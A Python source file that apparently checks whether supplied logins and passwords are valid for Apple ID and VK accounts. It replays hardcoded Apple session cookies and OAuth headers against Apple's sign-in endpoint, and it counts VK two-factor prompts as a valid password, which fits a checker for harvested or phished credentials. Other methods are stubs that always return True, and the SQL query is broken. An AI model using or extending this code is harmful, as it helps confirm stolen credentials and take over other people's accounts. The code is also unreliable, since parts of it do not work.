import sqlite3
import requests

class Check:
    def __init__(self):
        ...

    def standart(self, login: str, password: str) -> bool:
        return True

    def google(self, login: str, password: str) -> bool:

        return True

    def pin(self, pincode: str or int) -> bool:
        return True

    def apple_id(self, login: str, password: str) -> bool:
        cookies = {
            'geo': 'RU',
            'POD': 'ru~ru',
            's_fid': '6564476DC0471C19-3B8AE5CA6BAD6EDF',
            's_cc': 'true',
            's_vi': '[CS]v1|311AA3D03575FEA2-600007D1F9B2C5EB[CE]',
            's_orientation': '%5B%5BB%5D%5D',
            's_ppvl': 'acs%253A%253Apsp%253A%253Aapple-id%253A%253Alanding%2520%2528ru-ru%2529%2C16%2C16%2C688%2C601%2C688%2C1440%2C900%2C2%2CL',
            's_ppv': 'acs%253A%253Apsp%253A%253Aapple-id%253A%253Alanding%2520%2528ru-ru%2529%2C29%2C16%2C1244%2C601%2C688%2C1440%2C900%2C2%2CL',
            's_orientationHeight': '932',
            's_sq': '%5B%5BB%5D%5D',
            'dslang': 'RU-RU',
            'site': 'RUS',
            'aasp': '15C379C67526CD57ECAAA6445402DE84BEDA0D501FD986CBDE34377474E72C95E6B96BF67CFDECD066DA976738953C5F63CA93ACC0BE592B56805580B1CF3CC4E4E24D19FB876D21C93C05D770B2E86DA0A5C6CA9CE87838D7CF231F071C77BC079F38E498B05D867F6697D1B4088F0B81D5FBE83A9ED085',
            'aa': 'CEC8AF0CEDE5FBC692CE817719FC8487',
        }

        headers = {
            'Connection': 'keep-alive',
            'sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="99", "Google Chrome";v="99"',
            'scnt': 'AAAA+jE1QzM3OUM2NzUyNkNENTdFQ0FBQTY0NDU0MDJERTg0QkVEQTBENTAxRkQ5ODZDQkRFMzQzNzc0NzRFNzJDOTVFNkI5NkJGNjdDRkRFQ0QwNjZEQTk3NjczODk1M0M1RjYzQ0E5M0FDQzBCRTU5MkI1NjgwNTU4MEIxQ0YzQ0M0RTRFMjREMTlGQjg3NkQyMUM5M0MwNUQ3NzBCMkU4NkRBMEE1QzZDQTlDRTg3ODM4RDdDRjIzMUYwNzFDNzdCQzA3OUYzOEU0OThCMDVEODY3RjY2OTdEMUI0MDg4RjBCODFENUZCRTgzQTlFRDA4NXwyAAABf6Auh7KOOX9uhUKgG3LS65eeaBUdbpJDU99jQU2mhA9ZenRCoX6Mio6tVYeCAAjxnvPNvDsTywkYIJcstfDi2s1O1wDVwIRnJZ4ul1PDQ41EQhQeAg==',
            'X-Apple-Widget-Key': 'af1139274f266b22b68c2a3e7ad932cb3c0bbe854e13a79af78dcc73136882c3',
            'X-Apple-Frame-Id': 'auth-0xvmdmg9-jr8v-vt07-yfz6-5pj62xg1',
            'X-Apple-I-FD-Client-Info': '{"U":"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.74 Safari/537.36","L":"ru-RU","Z":"GMT+03:00","V":"1.1","F":"cla44j1e3NlY5BNlY5BSs5uQ084akJ.OF5uxidZaKSCsOQNBpAIQjJKy_Aw7GY6pjVApNk91kMhQIae4HhrkVUkdUka5BNlY5CGWY5BOgkLT0XxU..7qm"}',
            'X-Apple-OAuth-Redirect-URI': 'https://appleid.apple.com',
            'X-Apple-OAuth-Client-Id': 'af1139274f266b22b68c2a3e7ad932cb3c0bbe854e13a79af78dcc73136882c3',
            'X-Apple-OAuth-Client-Type': 'firstPartyAuth',
            'X-Requested-With': 'XMLHttpRequest',
            'X-APPLE-HC': '1:11:20220319030232:d85f3dace5071bf25885a80daf6eb94f::819',
            'sec-ch-ua-platform': '"macOS"',
            'sec-ch-ua-mobile': '?0',
            'X-Apple-OAuth-Response-Type': 'code',
            'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.74 Safari/537.36',
            'X-Apple-OAuth-Response-Mode': 'web_message',
            'Accept': 'application/json, text/javascript, */*; q=0.01',
            'X-Apple-Domain-Id': '1',
            'X-Apple-OAuth-State': 'auth-0xvmdmg9-jr8v-vt07-yfz6-5pj62xg1',
            'Origin': 'https://idmsa.apple.com',
            'Sec-Fetch-Site': 'same-origin',
            'Sec-Fetch-Mode': 'cors',
            'Sec-Fetch-Dest': 'empty',
            'Referer': 'https://idmsa.apple.com/',
            'Accept-Language': 'ru-RU,ru;q=0.9,en-US;q=0.8,en;q=0.7',
        }

        params = (
            ('isRememberMeEnabled', 'true'),
        )

        json_data = {
            'accountName': login,
            'rememberMe': False,
            'password': password,
        }

        response = requests.post('https://idmsa.apple.com/appleauth/auth/signin', headers=headers, params=params,
                                 cookies=cookies, json=json_data)

        if response.status_code in [409, 200]:
            return True
        else:
            return False


    def vk(self, number: str or int, password: str) -> bool:
        import vk_api
        vk = vk_api.VkApi(login=number, password=password)
        try:
            vk.auth()
        except vk_api.BadPassword:
            return False
        except vk_api.TwoFactorError:
            return True
        except vk_api.AuthError:
            return True

    def totp(self, salt: str, code: str or int) -> bool:
        import pyotp

        code = str(code)
        totp = pyotp.TOTP(salt)
        if code == str(totp.now()):
            return True
        else:
            return False


class DB:
    def __init__(self):
        self.con = sqlite3.connect("base.db")
        self.cur = self.con.cursor()

    def get_login_paasord(self, login: str, password: str) -> bool:
        self.cur.execute('SELECT id WHERE login=? AND password=?')
